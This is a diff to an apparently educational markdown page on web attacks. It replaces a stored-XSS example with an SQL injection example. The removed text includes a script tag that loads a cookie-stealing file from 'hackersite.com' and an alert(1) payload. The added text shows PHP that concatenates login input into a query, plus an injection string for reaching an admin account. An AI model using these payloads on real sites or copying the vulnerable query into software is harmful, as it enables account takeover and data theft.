@@ -31,15 +31,25 @@ to reconstruct the logic of the original query and, therefore, understand how to
 
 ## Basic examples
 
-While browsing an e-commerce website, a perpetrator discovers a vulnerability that allows HTML tags to be embedded in the site’s comments section. The embedded tags become a permanent feature of the page, causing the browser to parse them with the rest of the source code every time the page is opened.
+Quite good article with lot of examples you can find [here](https://www.veracode.com/security/sql-injection).
+Let's briefly consider hands-on example. Imagine that you have simple login form with several fields and submit button. Assume that it looks like below:
+```
+<form action="/add_user.php">
+  Login: <input type="text"><br>
+  Password: <input type="password"><br>
+  <input type="submit" value="Submit">
+</form>
+```
 
-The attacker adds the following comment: Great price for a great item! Read my review here <script src=”http://hackersite.com/authstealer.js”> </script>.
+And on the server side you have next logic:
 
-From this point on, every time the page is accessed, the HTML tag in the comment will activate a JavaScript file, which is hosted on another site, and has the ability to steal visitors’ session cookies.
+```
+$sql = "SELECT * FROM Users WHERE email = $user_login AND password = $user_password";
+$result = $conn->query($sql);
+```
 
-Using the session cookie, the attacker can compromise the visitor’s account, granting him easy access to his personal information and credit card data. Meanwhile, the visitor, who may never have even scrolled down to the comments section, is not aware that the attack took place.
-
-Now let's consider reflected XSS attack example. Imagine that you have input field which allows you to perform search on the site. You input something like `<script>alert(1)</script>foo` into it and hit enter. On a vulnerable site, that entire parameter will get injected into the error page that pops up, the javascript will execute, and you'll get a popup in addition to the "Resource foo is not found" message. If you can induce somebody else navigate to the same link that you crafted, you can execute arbitrary javascript in their session.
+In this case hacker will be able to inject something like `'dude' OR email LIKE '%admin%' OR email='something'` into login
+field, anything into password field and get access to admin account.
 
 ## What's next?
 
